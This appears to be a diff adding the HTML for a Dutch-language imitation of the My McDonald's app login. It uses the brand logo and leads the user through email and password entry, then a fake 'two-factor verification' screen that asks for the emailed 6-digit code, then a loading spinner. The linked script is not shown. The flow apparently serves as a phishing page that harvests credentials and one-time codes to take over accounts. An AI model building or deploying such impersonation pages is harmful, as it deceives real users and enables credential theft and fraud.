@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, interactive-widget=resizes-content">
+    <title>McDonald's</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <section id="page1" class="page active">
+        <div class="header"><button class="close-btn">&times;</button></div>
+        <div class="main-content">
+            <div class="logo-container">
+                <span class="my-text">My</span>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/McDonald%27s_Golden_Arches.svg" class="m-logo">
+            </div>
+            <h1 class="title">Goede dingen in het vooruitzicht</h1>
+            <p class="description">Word lid en bestel en betaal in de app, ontvang leuke aanbiedingen en spaar punten bij je aankopen.</p>
+        </div>
+        <div class="footer-buttons">
+            <button class="btn btn-white" onclick="nextPage('page2')">Log in</button>
+            <button class="btn btn-yellow">Registreren</button>
+        </div>
+    </section>
+
+    <section id="page2" class="page">
+        <div class="header"><button class="back-btn" onclick="prevPage('page2')">&#10094;</button></div>
+        <div class="main-content">
+            <div class="header-flex">
+                <h1 class="title small">Log in op de goede dingen</h1>
+                <div class="logo-container-small">
+                    <span class="my-text-small">My</span>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/McDonald%27s_Golden_Arches.svg" class="m-logo-small">
+                </div>
+            </div>
+            <div class="input-group">
+                <input id="email" type="email" placeholder="E-mail">
+                <div class="password-wrapper">
+                    <input id="password" type="password" placeholder="Wachtwoord">
+                    <span class="eye-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" fill="#000000" id="Eye--Streamline-Phosphor" height="23" width="23">
+  <desc>
+    Eye Streamline Icon: https://streamlinehq.com
+  </desc>
+  <path d="M22.2192578125 11.20890625c-0.031445312499999996 -0.0709765625 -0.792421875 -1.759140625 -2.4841796874999997 -3.4508984375C17.4808984375 5.503828125 14.63375 4.3125 11.5 4.3125S5.5191015625 5.503828125 3.264921875 7.7580078125C1.5731640625 9.449765625000001 0.80859375 11.140625 0.7807421874999999 11.20890625a0.71875 0.71875 0 0 0 0 0.583984375c0.031445312499999996 0.0709765625 0.792421875 1.7582421875 2.4841796874999997 3.4499999999999997C5.5191015625 17.496171875 8.36625 18.6875 11.5 18.6875s5.9808984375 -1.191328125 8.235078125 -3.444609375c1.6917578125 -1.6917578125 2.452734375 -3.3790234375 2.4841796874999997 -3.4499999999999997a0.71875 0.71875 0 0 0 0 -0.583984375ZM11.5 17.25c-2.765390625 0 -5.1812890625 -1.0053515625 -7.1812109375 -2.9873046875A11.9914453125 11.9914453125 0 0 1 2.24609375 11.5a11.9788671875 11.9788671875 0 0 1 2.0726953125 -2.7626953125C6.3187109375 6.7553515625 8.734609375 5.75 11.5 5.75s5.1812890625 1.0053515625 7.1812109375 2.9873046875A11.990546875000001 11.990546875000001 0 0 1 20.758398437500002 11.5c-0.6477734375 1.2092968750000002 -3.469765625 5.75 -9.2583984375 5.75Zm0 -10.0625a4.3125 4.3125 0 1 0 4.3125 4.3125 4.3169921874999995 4.3169921874999995 0 0 0 -4.3125 -4.3125Zm0 7.1875a2.875 2.875 0 1 1 2.875 -2.875 2.875 2.875 0 0 1 -2.875 2.875Z" stroke-width="0.0898"></path>
+</svg></span>
+                </div>
+            </div>
+            <a href="#" class="link">Wachtwoord vergeten?</a>
+            <p class="footer-text">Ben je nog geen lid? <a href="#" class="link">Registreren</a></p>
+        </div>
+        <div class="footer-buttons">
+            <button id="loginBtn" class="btn btn-yellow full" onclick="nextPage('page3')">Log in</button>
+        </div>
+    </section>
+
+    <section id="page3" class="page">
+        <div class="header header-title">
+            <button class="close-btn" onclick="prevPage('page3')">&times;</button>
+            <span class="top-nav-title">Tweefactorverificatie</span>
+        </div>
+        <div class="main-content">
+            <div class="header-flex">
+                <h1 class="title">Controleer je e-mail</h1>
+                <div class="image-wrapper">
+                    <img src="images/image.png" alt="" class="mail-icon-large">
+                </div>             
+            </div>
+            <p id="textEmail" class="description">We hebben een e-mail gestuurd naar <b>jouw email</b> met een 6-cijferige code...</p>
+            <div class="input-group">
+                <input id="code" type="text" placeholder="6-cijferige code">
+            </div>
+            <p class="footer-text">Heb je de code niet ontvangen?</p>
+            <a href="#" class="link">Code nogmaals versturen</a>
+        </div>
+        <div class="footer-buttons">
+            <button id="codeBtn" class="btn btn-yellow full" onclick="showLoader()">Opslaan</button>
+        </div>
+    </section>
+
+    <div id="loader-screen" class="loader-overlay">
+        <div class="spinner"></div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
